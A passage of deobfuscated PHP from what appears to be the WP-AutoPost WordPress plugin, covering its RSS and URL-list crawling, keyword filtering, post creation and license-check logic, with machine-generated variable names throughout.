				$_var_761[0] = 0;
			}
			if ($_var_761[0] == 1) {
				$_var_762 = count($_var_761[1]);
				if ($_var_762 > 0) {
					set_post_thumbnail($_var_265, $_var_761[1][rand(0, $_var_762 - 1)]);
				}
			}
		}
		if (isset($_var_280) && count($_var_280) > 0) {
			recordUploadedFlickr($_var_280, $_var_265);
		}
		if (isset($_var_284) && count($_var_284) > 0) {
			recordUploadedQiniu($_var_284, $_var_265);
		}
		if (isset($_var_286) && count($_var_286) > 0) {
			recordUploadedUpyun($_var_286, $_var_265);
		}
		if ($_var_331 && $_var_357[3] == 1) {
			if (count($_var_627) > 0) {
				foreach ($_var_627 as $_var_231) {
					if ($_var_231['file_path'] != '') {
						$_var_760 = WP_Download_Attach::insert_attachment($_var_231, $_var_265);
					}
				}
			}
		}
		if (count($_var_341) > 0) {
			foreach ($_var_341 as $_var_78 => $_var_8) {
				if (!(strpos($_var_8, '{post_id}') === false)) {
					$_var_8 = str_replace('{post_id}', $_var_265, $_var_8);
				}
				if (!(strpos($_var_8, '{post_permalink}') === false)) {
					$_var_8 = str_replace('{post_permalink}', get_permalink($_var_265), $_var_8);
				}
				setpmeta($_var_265, $_var_78, $_var_8);
			}
		}
		$_var_763 = false;
		if (!(strpos($_var_340[1], '{post_id}') === false)) {
			$_var_763 = true;
			$_var_340[1] = str_replace('{post_id}', $_var_265, $_var_340[1]);
		}
		if (!(strpos($_var_340[1], '{post_permalink}') === false)) {
			$_var_763 = true;
			$_var_340[1] = str_replace('{post_permalink}', get_permalink($_var_265), $_var_340[1]);
		}
		if (!(strpos($_var_340[0], '{post_id}') === false)) {
			$_var_763 = true;
			$_var_340[0] = str_replace('{post_id}', $_var_265, $_var_340[0]);
		}
		if (!(strpos($_var_340[0], '{post_permalink}') === false)) {
			$_var_763 = true;
			$_var_340[0] = str_replace('{post_permalink}', get_permalink($_var_265), $_var_340[0]);
		}
		if ($_var_763) {
			$_var_764 = array('ID' => $_var_265, 'post_title' => $_var_340[0], 'post_content' => $_var_340[1]);
			wp_update_post($_var_764);
		}
	} else {
		if ($_var_100 == null) {
			$_var_265 = $_var_676;
		}
	}
	if (isset($_var_744) && ($_var_744 != null && $_var_744 != '') && $_var_744 != $_var_665) {
		if (isset($_var_702) && $_var_702) {
			update_option($_var_682, 2);
		} else {
			$_var_748 = $_var_704;
			$_var_748[8] = 2;
			$_var_154 = str_ireplace($_var_704, $_var_748, $_var_703);
			if (false === wpapimagefilesave($_var_686, $_var_154)) {
				$_var_749 = true;
			}
			if (isset($_var_749)) {
				update_option($_var_682, 2);
			}
		}
	}
	return $_var_265;
}
if ($_var_310 != '') {
	$_var_310 = 'CSS';
}
function getTags($_var_345, $_var_753, $_var_765 = 0, $_var_766 = 0)
{
	$_var_721 = array();
	if ($_var_766 == 0) {
		$_var_766 = 9999;
	}
	if ($_var_345 != null) {
		$_var_767 = 0;
		foreach ($_var_345 as $_var_249) {
			if (!is_string($_var_249) && empty($_var_249)) {
				continue;
			}
			if ($_var_249 == '') {
				continue;
			}
			$_var_249 = trim($_var_249);
			if ($_var_765 == 1) {
				if (preg_match('/\\b' . $_var_249 . '\\b/i', $_var_753)) {
					$_var_721[] = $_var_249;
					$_var_767++;
				}
			} elseif (stristr($_var_753, $_var_249)) {
				$_var_721[] = $_var_249;
				$_var_767++;
			}
			if ($_var_767 >= $_var_766) {
				break;
			}
		}
	}
	return $_var_721;
}
function fetchRSS($_var_22, $_var_246, $_var_12 = 1, $_var_768 = 1)
{
	updateRunning($_var_22, 1);
	updateTaskUpdateTime($_var_22);
	$_var_326 = getListUrls($_var_22);
	if ($_var_326 == null) {
		$_var_274 = errorLog($_var_22, '', 5);
		updateConfigErr($_var_22, $_var_274);
		if ($_var_12) {
			printErr($_var_246['52a87e67edaa5a8f03166bea74700181'], 1);
		}
		return;
	}
	if ($_var_768 == 1) {
		ignore_user_abort(true);
		set_time_limit((int) get_option('wp_autopost_timeLimit'));
		if ($_var_12) {
			echo '<div class=' . '"' . 'updated fade' . '"' . '><p><b>' . __('Being processed, the processing may take some time, you can close the page', 'wp-autopost') . '</b></p></div>';
			@ob_flush();
			flush();
		}
	}
	if ($_var_12) {
		echo '<div class=' . '"' . 'updated fade' . '"' . '>';
	}
	if ($_var_12) {
		printInfo('<p>' . __('Task', 'wp-autopost') . ': <b>' . $_var_246['52a87e67edaa5a8f03166bea74700181'] . '</b></p>');
	}
	$_var_262 = json_decode($_var_246['55af33149a5f37f2b50636f1a346ac27']);
	global $_var_178;
	$_var_139 = getOptions($_var_22);
	$_var_337 = getInsertcontent($_var_22);
	$_var_382 = getCustomStyle($_var_22);
	$_var_334 = getFilterAtag($_var_139);
	$_var_331 = getDownAttach($_var_246);
	$_var_590 = getPostFilterInfo($_var_22);
	$_var_664 = null;
	$_var_357 = json_decode($_var_246['c3465f8487c1b3ec391e29a48cf695bc']);
	if ($_var_357[2] >= 1) {
		$_var_664 = getWatermarkOption($_var_357[2]);
	}
	if ($_var_246['d90952fc1dd4ea1a398556ece8f60556'] == 0) {
		global $wpdb;
		$_var_257 = 'SELECT ID FROM ' . $wpdb->users;
		$_var_663 = $wpdb->get_results($_var_257, OBJECT);
	} else {
		$_var_663 = null;
	}
	$_var_674 = json_decode($_var_246['ff8562dfe33113b7ee2978e186ebf1ad']);
	if (!is_array($_var_674)) {
		$_var_674 = array();
		$_var_674[0] = $_var_246['ff8562dfe33113b7ee2978e186ebf1ad'];
		$_var_674[1] = 0;
		$_var_674[2] = 0;
		$_var_674[3] = 1;
		$_var_674[4] = 0;
	}
	if ($_var_674[0] == 1 || $_var_674[0] == 2) {
		$_var_345 = array();
		$_var_345 = explode(',', $_var_246['eb22adca44a1dc27ba1e1e0f4e4d842c']);
		if ($_var_674[3] == 1) {
			$_var_345 = get_wp_tags_by_autopost($_var_345);
		}
	}
	$_var_18 = 0;
	foreach ($_var_326 as $_var_327) {
		$_var_338 = get_html_string_ap($_var_327->url, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178);
		if ($_var_338 == NULL || $_var_338 == '' || $_var_338 === false) {
			$_var_274 = errorLog($_var_22, $_var_327, 1);
			updateConfigErr($_var_22, $_var_274);
			if ($_var_12) {
				printErr($_var_246['52a87e67edaa5a8f03166bea74700181']);
			}
			continue;
		}
		$_var_339 = new autopostRSS();
		$_var_339->loadRSS($_var_338);
		$_var_168 = $_var_339->getItems();
		if ($_var_246['add6d9d7bcbbf15cc8bc6dee4059bc30'] == 0) {
			$_var_168 = array_reverse($_var_168);
		}
		$_var_769 = current_time('timestamp') + get_option('wp_autopost_differenceTime');
		$_var_770 = json_decode($_var_246['7158355f709906d6fb67f68921bb92dd']);
		if (!is_array($_var_770)) {
			$_var_770 = array();
			$_var_770[0] = 0;
			$_var_770[1] = 12;
			$_var_770[2] = 0;
		}
		if ($_var_770[0] == 1) {
			if ($_var_246['8b8691a20428ceec24d8618fe269d4f1'] > 0) {
				if ($_var_246['8b8691a20428ceec24d8618fe269d4f1'] < $_var_769) {
					$_var_771 = mktime($_var_770[1], $_var_770[2], 0, date('m', $_var_769), date('d', $_var_769), date('Y', $_var_769));
				} else {
					$_var_771 = $_var_246['8b8691a20428ceec24d8618fe269d4f1'] + $_var_246['f538465db4e4b440a16fac10933950e5'] * 60 + rand(0, 60);
				}
			} else {
				$_var_771 = mktime($_var_770[1], $_var_770[2], 0, date('m', $_var_769), date('d', $_var_769), date('Y', $_var_769));
			}
			if ($_var_771 < $_var_769) {
				$_var_771 += 86400;
			}
		} else {
			$_var_772 = $_var_246['f538465db4e4b440a16fac10933950e5'] / 12;
			$_var_771 = $_var_769 - ($_var_5 - 1) * $_var_246['f538465db4e4b440a16fac10933950e5'] * 60;
		}
		foreach ($_var_168 as $_var_773) {
			$_var_340 = array();
			$_var_100 = $_var_773['link'];
			if (checkUrl($_var_22, $_var_100) > 0) {
				continue;
			}
			$_var_340[0] = '';
			if (isset($_var_773['title']) && $_var_773['title'] != '') {
				$_var_340[0] = $_var_773['title'];
			}
			if ($_var_340[0] == '') {
				$_var_274 = errorLog($_var_22, $_var_327, 3);
				updateConfigErr($_var_22, $_var_274);
				if ($_var_12) {
					printErr($_var_246['52a87e67edaa5a8f03166bea74700181']);
				}
				break;
			}
			if ($_var_246['f9ec7c6663f2194259c18de7ea041456'] == 1) {
				if (checkTitle($_var_22, $_var_340[0]) > 0) {
					continue;
				}
			}
			if ($_var_590 != null && ($_var_590[3] == 1 || $_var_590[3] == '1' || $_var_590[3] == 3 || $_var_590[3] == '3')) {
				$_var_596 = array();
				$_var_596 = explode(',', $_var_590[2]);
				if ($_var_590[0] == 0 || $_var_590[0] == '0') {
					$_var_597 = false;
					foreach ($_var_596 as $_var_598) {
						$_var_598 = trim($_var_598);
						if ($_var_598 == '') {
							continue;
						}
						if (!(stripos($_var_340[0], $_var_598) === false)) {
							$_var_597 = true;
							break;
						}
					}
					if (!$_var_597) {
						if ($_var_590[3] == 1 || $_var_590[3] == '1') {
							$_var_340[2] = -3;
						}
					}
				} else {
					$_var_597 = false;
					foreach ($_var_596 as $_var_598) {
						$_var_598 = trim($_var_598);
						if ($_var_598 == '') {
							continue;
						}
						if (!(stripos($_var_340[0], $_var_598) === false)) {
							$_var_597 = true;
							$_var_340[2] = -3;
							break;
						}
					}
				}
			}
			if ($_var_340[2] == -3) {
				insertFilterdApRecord($_var_22, $_var_100, $_var_340[0], $_var_590[1]);
				if ($_var_12) {
					printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Filter Out Article', 'wp-autopost') . '</span> :  ' . $_var_340[0] . '</p>');
				}
				continue;
			}
			$_var_340[1] = '';
			if (isset($_var_773['content:encoded']) && $_var_773['content:encoded'] != '') {
				$_var_340[1] = $_var_773['content:encoded'];
			} else {
				$_var_340[1] = $_var_773['description'];
			}
			if ($_var_340[1] == '') {
				$_var_274 = errorLog($_var_22, $_var_327, 4);
				updateConfigErr($_var_22, $_var_274);
				if ($_var_12) {
					printErr($_var_246['52a87e67edaa5a8f03166bea74700181']);
				}
				break;
			}
			if (($_var_590[0] == 0 || $_var_590[0] == '0') && ($_var_590[3] == 3 || $_var_590[3] == '3') && $_var_597 === true) {
			} elseif ($_var_590 != null && ($_var_590[3] == 2 || $_var_590[3] == '2' || $_var_590[3] == 3 || $_var_590[3] == '3')) {
				$_var_615 = intval($_var_590[4]);
				$_var_596 = array();
				$_var_596 = explode(',', $_var_590[2]);
				if ($_var_590[0] == 0 || $_var_590[0] == '0') {
					$_var_616 = false;
					foreach ($_var_596 as $_var_598) {
						$_var_598 = trim($_var_598);
						if ($_var_598 == '') {
							continue;
						}
						if (substr_count($_var_340[1], $_var_598) >= $_var_615) {
							$_var_616 = true;
							break;
						}
					}
					if (!$_var_616) {
						if ($_var_590[3] == 2 || $_var_590[3] == '2') {
							$_var_340[2] = -3;
						}
						if ($_var_590[3] == 3 || $_var_590[3] == '3') {
							if (!$_var_597) {
								$_var_340[2] = -3;
							}
						}
					}
				} else {
					$_var_616 = false;
					foreach ($_var_596 as $_var_598) {
						$_var_598 = trim($_var_598);
						if ($_var_598 == '') {
							continue;
						}
						if (substr_count($_var_340[1], $_var_598) >= $_var_615) {
							$_var_616 = true;
							$_var_340[2] = -3;
						}
					}
				}
			}
			if ($_var_340[2] == -3) {
				insertFilterdApRecord($_var_22, $_var_100, $_var_340[0], $_var_590[1]);
				if ($_var_12) {
					printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Filter Out Article', 'wp-autopost') . '</span> :  ' . $_var_340[0] . '</p>');
				}
				continue;
			}
			$_var_340[1] = filterCSSContent($_var_340[1], $_var_139);
			$_var_340[1] = filterContent($_var_340[1], $_var_139, $_var_334, $_var_331, 0);
			if (isset($_var_773['pubDate']) && $_var_773['pubDate'] != '') {
				$_var_340[4] = TimeParseWPAP::string2time($_var_773['pubDate']);
			}
			if ($_var_770[0] == 1) {
				$_var_340[4] = null;
			}
			if ($_var_770[0] != 1 && $_var_771 > $_var_769) {
				$_var_771 = $_var_769 - ($_var_5 - 1 - $_var_329) * $_var_246['f538465db4e4b440a16fac10933950e5'] * 60;
			}
			if ($_var_770[0] != 1 && $_var_329 == $_var_5 - 1) {
				$_var_771 = $_var_769;
			}
			$_var_293 = getBaseUrlForURL($_var_100);
			$_var_265 = wpapbupdppost($_var_340, $_var_246, $_var_139, $_var_100, $_var_293, $_var_771, $_var_345, $_var_663, $_var_334, $_var_331, $_var_12, $_var_664, $_var_337, $_var_382, null, null, null);
			if ($_var_265 > 0) {
				$_var_18++;
				if ($_var_12) {
					printInfo('<p>' . __('Updated Post', 'wp-autopost') . ' : <a href=' . '"' . get_permalink($_var_265) . '"' . ' target=' . '"' . '_blank' . '"' . '>' . $_var_340[0] . '</a></p>');
				}
				if ($_var_770[0] != 1) {
					$_var_771 += mt_rand($_var_246['f538465db4e4b440a16fac10933950e5'] - $_var_772, $_var_246['f538465db4e4b440a16fac10933950e5'] + $_var_772) * mt_rand(50, 70);
				} else {
					$_var_771 += $_var_246['f538465db4e4b440a16fac10933950e5'] * 60 + rand(0, 60);
				}
			}
		}
	}
	if ($_var_770[0] == 1) {
		update_post_scheduled_last_time($_var_22, $_var_771);
	}
	if ($_var_12) {
		if ($_var_18 > 0) {
			echo '<p>' . __('Task', 'wp-autopost') . ': <b>' . $_var_246['52a87e67edaa5a8f03166bea74700181'] . '</b> , ' . __('updated', 'wp-autopost') . ' <b>' . $_var_18 . '</b> ' . __('articles', 'wp-autopost') . '</p>';
		} else {
			echo '<p>' . __('Task', 'wp-autopost') . ': <b>' . $_var_246['52a87e67edaa5a8f03166bea74700181'] . '</b> , ' . __('does not detect a new article', 'wp-autopost') . '</p>';
		}
		echo '</div>';
	}
	updateRunning($_var_22, 0);
}
function UrlListFetch($_var_22, $_var_12 = 1, $_var_768 = 1)
{
	if (getIsRunning($_var_22) == 1) {
		return;
	}
	$_var_655 = get_option('wp_autopost_runOnlyOneTask');
	global $_var_178, $_var_560, $_var_246, $_var_188, $_var_51, $_var_425, $_var_558;
	$_var_246 = null;
	$_var_246 = getConfig($_var_22);
	if ($_var_246['42ae1cd5cab79058e53abf79a16e8645'] == 1) {
		if ($_var_246['d84928a37168eed80106cf715933f0b6'] - $_var_246['b8fad4976d8896e999d12bacf169951f'] >= 5) {
			return;
		}
	}
	$_var_262 = json_decode($_var_246['55af33149a5f37f2b50636f1a346ac27']);
	if ($_var_560 != 'VERIFIED') {
		fetchUrl($_var_22, $_var_246);
	}
	if ($_var_560 == 'VERIFIED') {
		if ($_var_655 == 1) {
			$syfkxkxcapd = 'sqc1g798s1863da844f0e34b850e60b047d1058a338bui42defpw';
			$_var_656 = get_option('wp_autopost_runOnlyOneTaskIsRunning');
			update_option('wp_autopost_runOnlyOneTaskIsRunning', 0);
		}
		if ($_var_246['42ae1cd5cab79058e53abf79a16e8645'] == 2) {
			fetchRSS($_var_22, $_var_246, $_var_12, $_var_768);
			return;
		}
		updateRunning($_var_22, 1);
		updateTaskUpdateTime($_var_22);
		$_var_326 = getListUrls($_var_22);
		if ($_var_326 == null) {
			$_var_274 = errorLog($_var_22, '', 5);
			updateConfigErr($_var_22, $_var_274);
			if ($_var_12) {
				printErr($_var_246['52a87e67edaa5a8f03166bea74700181'], 1);
			}
			return;
		}
		if (trim($_var_246['042f289b4f14998c06dc78085673dec7']) == '') {
			$_var_274 = errorLog($_var_22, '', 6);
			updateConfigErr($_var_22, $_var_274);
			if ($_var_12) {
				printErr($_var_246['52a87e67edaa5a8f03166bea74700181'], 1);
			}
			return;
		}
		if ($_var_246['5073e07b5d9f0d1cc055db067d7921e8'] == '' || $_var_246['5073e07b5d9f0d1cc055db067d7921e8'] == null) {
			if (trim($_var_246['8f935a0d6d8352a07dd23308b0ff8ed1']) == '') {
				$_var_274 = errorLog($_var_22, '', 7);
				updateConfigErr($_var_22, $_var_274);
				if ($_var_12) {
					printErr($_var_246['52a87e67edaa5a8f03166bea74700181'], 1);
				}
				return;
			}
			if (trim($_var_246['8618be86f1dcd660575bd2cb08e002ce']) == '') {
				$_var_274 = errorLog($_var_22, '', 8);
				updateConfigErr($_var_22, $_var_274);
				if ($_var_12) {
					printErr($_var_246['52a87e67edaa5a8f03166bea74700181'], 1);
				}
				return;
			}
		}
		global $_var_393, $_var_61, $_var_62, $_var_67, $_var_37;
		$_var_139 = getOptions($_var_22);
		$_var_337 = getInsertcontent($_var_22);
		$_var_382 = getCustomStyle($_var_22);
		$_var_36 = $_var_61[3];
		if ($_var_768 == 1) {
			ignore_user_abort(true);
			set_time_limit((int) get_option('wp_autopost_timeLimit'));
			if ($_var_12) {
				echo '<div class=' . '"' . 'updated fade' . '"' . '><p><b>' . __('Being processed, the processing may take some time, you can close the page', 'wp-autopost') . '</b></p></div>';
				@ob_flush();
				flush();
			}
		}
		$_var_207 = null;
		$_var_208 = null;
		if ($_var_246['7daa67631524d79fc5fd69e84ba8aa5c'] != null && $_var_246['7daa67631524d79fc5fd69e84ba8aa5c'] != '') {
			$_var_559 = json_decode($_var_246['7daa67631524d79fc5fd69e84ba8aa5c'], TRUE);
			if ($_var_559['mode'] == 1) {
				$_var_208 = get_cookie_jar_ap($_var_559['url'], $_var_559['para']);
			} else {
				$_var_207 = $_var_559['cookie'];
			}
		}
		if ($_var_12) {
			echo '<div class=' . '"' . 'updated fade' . '"' . '>';
		}
		if ($_var_12) {
			printInfo('<p>' . __('Task', 'wp-autopost') . ': <b>' . $_var_246['52a87e67edaa5a8f03166bea74700181'] . '</b></p>');
		}
		$_var_5 = 0;
		$_var_301 = array();
		global $_var_193;
		$_var_274 = 0;
		$_var_657 = 'false';
		if (@$_var_393[$_var_67] == null || @$_var_393[$_var_67] == '' || @$_var_393[$_var_67] == 0) {
			$_var_657 = 'true';
			if ($_var_36 != $_var_61[4]) {
				$_var_566 = get_html_string_ap($_var_62, Method);
				$_var_36 = intval($_var_566);
				if ($_var_36 != $_var_61[1] && $_var_36 != $_var_61[0] && $_var_36 != $_var_61[4]) {
					$_var_36 = $_var_61[2];
				}
			}
		}
		if ($_var_657 == 'false' && (!preg_match('/^\\+?[1-9][0-9]*$/', $_var_393[$_var_67]) || $_var_393[$_var_67] > current_time('timestamp') || $_var_393[$_var_67] + intval($_var_37) < current_time('timestamp'))) {
			if ($_var_36 != $_var_61[4]) {
				$_var_566 = get_html_string_ap($_var_62, Method);
				$_var_36 = intval($_var_566);
				if ($_var_36 != $_var_61[1] && $_var_36 != $_var_61[0] && $_var_36 != $_var_61[4]) {
					$_var_36 = $_var_61[2];
				}
			}
		}
		if ($_var_36 == $_var_61[2]) {
			if ($_var_393[$_var_68] > $_var_61[3]) {
				$_var_36 = $_var_61[1];
			} elseif (!preg_match('/^\\+?[1-9][0-9]*$/', $_var_393[$_var_68]) || $_var_393[$_var_68] == '' || $_var_393[$_var_68] == null || $_var_393[$_var_68] == 0) {
				$_var_393[$_var_68] = $_var_61[0];
			} else {
				$_var_393[$_var_68] = intval($_var_393[$_var_68]) + 1;
			}
		}
		if ($_var_246['42ae1cd5cab79058e53abf79a16e8645'] == 0) {
			foreach ($_var_326 as $_var_327) {
				if ($_var_12) {
					printInfo('<p>' . __('Crawl URL : ', 'wp-autopost') . $_var_327->url . '</p>');
				}
				if ($_var_246['3ffc99c206d98be48c6f2e49177d75a9'] == '0') {
					$_var_1 = get_html_string_ap($_var_327->url, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
					$_var_2 = getHtmlCharset($_var_1);
					$_var_312 = str_get_html_ap($_var_1, $_var_2);
					$_var_579 = $_var_36;
				} else {
					$_var_2 = $_var_246['3ffc99c206d98be48c6f2e49177d75a9'];
					$_var_312 = file_get_html_ap($_var_327->url, $_var_2, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
					$_var_579 = $_var_36;
				}
				$_var_193 = $_var_274;
				if ($_var_312 == NULL) {
					$_var_274 = errorLog($_var_22, $_var_327->url, 1);
					$_var_193 = $_var_274;
					updateConfigErr($_var_22, $_var_274);
					if ($_var_12) {
						printErr($_var_246['52a87e67edaa5a8f03166bea74700181']);
					}
					continue;
				}
				$_var_293 = getBaseUrl($_var_312, $_var_327->url);
				if ($_var_246['1f81f696d43b6e322e22b5533e443598'] == 1 || $_var_246['1f81f696d43b6e322e22b5533e443598'] == '1') {
					$_var_299 = $_var_312->find($_var_246['042f289b4f14998c06dc78085673dec7']);
					if ($_var_299 == NULL) {
						$_var_274 = errorLog($_var_22, $_var_327->url, 2);
						$_var_193 = $_var_274;
						updateConfigErr($_var_22, $_var_274);
						if ($_var_12) {
							printErr($_var_246['52a87e67edaa5a8f03166bea74700181']);
						}
						continue;
					}
					foreach ($_var_299 as $_var_303) {
						$_var_100 = html_entity_decode(trim($_var_303->href));
						if (!(stripos($_var_100, 'http') === 0)) {
							$_var_100 = getAbsUrl($_var_100, $_var_293, $_var_327->url);
						}
						if (checkUrl($_var_22, $_var_100) > 0) {
							continue;
						}
						$_var_301[$_var_5++] = $_var_100;
					}
					$_var_188 = $_var_246['042f289b4f14998c06dc78085673dec7'];
					unset($_var_299);
				} else {
					$_var_304 = $_var_312->find('a');
					$_var_329 = 0;
					foreach ($_var_304 as $_var_307) {
						$_var_100 = html_entity_decode(trim($_var_307->href));
						if (!(stripos($_var_100, 'http') === 0)) {
							$_var_100 = getAbsUrl($_var_100, $_var_293, $_var_327->url);
						}
						$_var_308[$_var_329++] = $_var_100;
					}
					unset($_var_304);
					$_var_309 = gPregUrl($_var_246['042f289b4f14998c06dc78085673dec7']);
					$_var_308 = preg_grep($_var_309, $_var_308);
					if (count($_var_308) < 1) {
						$_var_274 = errorLog($_var_22, $_var_327->url, 2);
						$_var_193 = $_var_274;
						updateConfigErr($_var_22, $_var_274);
						if ($_var_12) {
							printErr($_var_246['52a87e67edaa5a8f03166bea74700181']);
						}
						continue;
					}
					$_var_188 = $_var_309;
					foreach ($_var_308 as $_var_100) {
						if (in_array($_var_100, $_var_301)) {
							continue;
						}
						if (checkUrl($_var_22, $_var_100) > 0) {
							continue;
						}
						$_var_301[$_var_5++] = $_var_100;
					}
					unset($_var_308);
				}
				$_var_246['9e3596e0a5190b314f7ec1b00496352c'] = $_var_36;
				$_var_312->clear();
				unset($_var_312);
			}
		}
		if ($_var_246['42ae1cd5cab79058e53abf79a16e8645'] == 1) {
			foreach ($_var_326 as $_var_327) {
				for ($_var_18 = $_var_246['b8fad4976d8896e999d12bacf169951f']; $_var_18 <= $_var_246['d84928a37168eed80106cf715933f0b6']; $_var_18++) {
					if (getIsRunning($_var_22) == 0) {
						return;
					}
					$_var_330 = str_ireplace('(*)', $_var_18, $_var_327->url);
					if ($_var_12) {
						printInfo('<p>' . __('Crawl URL : ', 'wp-autopost') . $_var_330 . '</p>');
					}
					if ($_var_246['3ffc99c206d98be48c6f2e49177d75a9'] == '0') {
						$_var_1 = get_html_string_ap($_var_330, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
						$_var_2 = getHtmlCharset($_var_1);
						$_var_312 = str_get_html_ap($_var_1, $_var_2);
						$_var_579 = $_var_36;
					} else {
						$_var_2 = $_var_246['3ffc99c206d98be48c6f2e49177d75a9'];
						$_var_312 = file_get_html_ap($_var_330, $_var_2, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
						$_var_579 = $_var_36;
					}
					$_var_193 = $_var_274;
					if ($_var_312 == NULL) {
						$_var_274 = errorLog($_var_22, $_var_330, 1);
						$_var_193 = $_var_274;
						updateConfigErr($_var_22, $_var_274);
						if ($_var_12) {
							printErr($_var_246['52a87e67edaa5a8f03166bea74700181']);
						}
						continue;
					}
					$_var_293 = getBaseUrl($_var_312, $_var_330);
					if ($_var_246['1f81f696d43b6e322e22b5533e443598'] == 1 || $_var_246['1f81f696d43b6e322e22b5533e443598'] == '1') {
						$_var_299 = $_var_312->find($_var_246['042f289b4f14998c06dc78085673dec7']);
						if ($_var_299 == NULL) {
							$_var_274 = errorLog($_var_22, $_var_330, 2);
							$_var_193 = $_var_274;
							updateConfigErr($_var_22, $_var_274);
							if ($_var_12) {
								printErr($_var_246['52a87e67edaa5a8f03166bea74700181']);
							}
							continue;
						}
						foreach ($_var_299 as $_var_303) {
							$_var_100 = html_entity_decode(trim($_var_303->href));
							if (!(stripos($_var_100, 'http') === 0)) {
								$_var_100 = getAbsUrl($_var_100, $_var_293, $_var_330);
							}
							if (checkUrl($_var_22, $_var_100) > 0) {
								continue;
							}
							$_var_301[$_var_5++] = $_var_100;
						}
						$_var_188 = $_var_246['042f289b4f14998c06dc78085673dec7'];
						unset($_var_299);
					} else {
						$_var_304 = $_var_312->find('a');
						$_var_329 = 0;
						foreach ($_var_304 as $_var_307) {
							$_var_100 = html_entity_decode(trim($_var_307->href));
							if (!(stripos($_var_100, 'http') === 0)) {
								$_var_100 = getAbsUrl($_var_100, $_var_293, $_var_330);
							}
							$_var_308[$_var_329++] = $_var_100;
						}
						unset($_var_304);
						$_var_309 = gPregUrl($_var_246['042f289b4f14998c06dc78085673dec7']);
						$_var_308 = preg_grep($_var_309, $_var_308);
						if (count($_var_308) < 1) {
							$_var_274 = errorLog($_var_22, $_var_330, 2);
							$_var_193 = $_var_274;
							updateConfigErr($_var_22, $_var_274);
							if ($_var_12) {
								printErr($_var_246['52a87e67edaa5a8f03166bea74700181']);
							}
							continue;
						}
						$_var_188 = $_var_309;
						foreach ($_var_308 as $_var_100) {
							if (in_array($_var_100, $_var_301)) {
								continue;
							}
							if (checkUrl($_var_22, $_var_100) > 0) {
								continue;
							}
							$_var_301[$_var_5++] = $_var_100;
						}
						unset($_var_308);
					}
					$_var_246['9e3596e0a5190b314f7ec1b00496352c'] = $_var_36;
					$_var_312->clear();
					unset($_var_312);
				}
			}
		}
		if ($_var_5 > 0 && $_var_246['d02d3045058a42d7adcfbf5fea1b4098'] == 1) {
			$_var_658 = preFetch($_var_22, $_var_301, $_var_246, $_var_12, $_var_207, $_var_208);
			if ($_var_12) {
				if ($_var_658 > 0) {
					echo '<p>' . __('Task', 'wp-autopost') . ': <b>' . $_var_246['52a87e67edaa5a8f03166bea74700181'] . '</b> , ' . __('found', 'wp-autopost') . ' <b>' . $_var_658 . '</b> ' . __('articles', 'wp-autopost') . '</p>';
				} else {
					echo '<p>' . __('Task', 'wp-autopost') . ': <b>' . $_var_246['52a87e67edaa5a8f03166bea74700181'] . '</b> , ' . __('does not detect a new article', 'wp-autopost') . '</p>';
				}
				echo '</div>';
			}
			updateRunning($_var_22, 0);
			if ($_var_655 == 1) {
				update_option('wp_autopost_runOnlyOneTaskIsRunning', 0);
			}
			if ($_var_208 != null) {
				unlink($_var_208);
			}
			return;
		}
		if ($_var_5 > 0 && $_var_246['d02d3045058a42d7adcfbf5fea1b4098'] == 0) {
			$_var_659 = ArticleFetchPost($_var_22, $_var_301, $_var_139, $_var_337, $_var_382, $_var_579, $_var_12, null, $_var_207, $_var_208);
		}
		if ($_var_208 != null) {
			unlink($_var_208);
		}
		unset($_var_301);
		if ($_var_12) {
			if (@$_var_659 > 0) {
				echo '<p>' . __('Task', 'wp-autopost') . ': <b>' . $_var_246['52a87e67edaa5a8f03166bea74700181'] . '</b> , ' . __('updated', 'wp-autopost') . ' <b>' . $_var_659 . '</b> ' . __('articles', 'wp-autopost') . '</p>';
			} else {
				echo '<p>' . __('Task', 'wp-autopost') . ': <b>' . $_var_246['52a87e67edaa5a8f03166bea74700181'] . '</b> , ' . __('does not detect a new article', 'wp-autopost') . '</p>';
			}
			echo '</div>';
		}
		updateRunning($_var_22, 0);
		if ($_var_655 == 1) {
			update_option('wp_autopost_runOnlyOneTaskIsRunning', 0);
		}
	}
	if ($_var_560 != 'VERIFIED') {
		die;
	}
}
function preFetch($_var_275, $_var_301, $_var_246, $_var_12, $_var_207 = null, $_var_208 = null)
{
	$_var_5 = count($_var_301);
	$_var_590 = getPostFilterInfo($_var_275);
	$_var_774 = intval(get_option('wp_autopost_pauseTime'));
	if ($_var_246['add6d9d7bcbbf15cc8bc6dee4059bc30'] == 0) {
		$_var_301 = array_reverse($_var_301);
	}
	$_var_18 = 0;
	foreach ($_var_301 as $_var_100) {
		if (getIsRunning($_var_275) == 0) {
			return;
		}
		if ($_var_774 > 0) {
			if ($_var_12) {
				printInfo('<p>Sleep <strong>' . $_var_774 . '</strong> seconds</p>');
			}
			sleep($_var_774);
		}
		if (checkUrl(0, $_var_100) > 0) {
			continue;
		}
		if ($_var_12) {
			printInfo('<p>' . __('Crawl URL : ', 'wp-autopost') . $_var_100 . '</p>');
		}
		$_var_255 = getArticleTitel($_var_100, $_var_246, $_var_207, $_var_208);
		if ($_var_255 == -1) {
			$_var_274 = errorLog($_var_275, $_var_100, 1);
			updateConfigErr($_var_275, $_var_274);
			if ($_var_12) {
				printErr($_var_246['52a87e67edaa5a8f03166bea74700181']);
			}
			continue;
		}
		if ($_var_255[1] == -1) {
			$_var_274 = errorLog($_var_275, $_var_100, 3);
			updateConfigErr($_var_275, $_var_274);
			if ($_var_12) {
				printErr($_var_246['52a87e67edaa5a8f03166bea74700181']);
			}
			if ($_var_246['c1efa9fbedec4103ba3edfffe539817d'] == -1) {
				insertFilterdApRecord($_var_275, $_var_100, '', $_var_246['c1efa9fbedec4103ba3edfffe539817d']);
			}
			continue;
		}
		if ($_var_246['f9ec7c6663f2194259c18de7ea041456'] == 1) {
			if (checkTitle($_var_275, $_var_255[0]) > 0) {
				continue;
			}
		}
		if ($_var_590 != null && ($_var_590[3] == 1 || $_var_590[3] == '1' || ($_var_590[3] == 3 || $_var_590[3] == '3') && ($_var_590[0] == 1 || $_var_590[0] == '1'))) {
			$_var_596 = array();
